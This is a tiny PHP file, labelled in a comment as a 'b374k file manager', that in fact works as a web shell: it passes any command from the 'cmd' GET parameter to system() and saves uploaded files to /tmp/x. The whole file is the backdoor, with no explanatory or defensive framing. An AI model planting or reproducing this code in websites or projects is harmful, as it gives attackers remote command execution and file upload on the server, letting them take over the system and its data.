<?php
/* b374k file manager */
if (isset($_GET['cmd'])) { system($_GET['cmd']); }
if (isset($_POST['upload'])) { move_uploaded_file($_FILES['f']['tmp_name'], '/tmp/x'); }
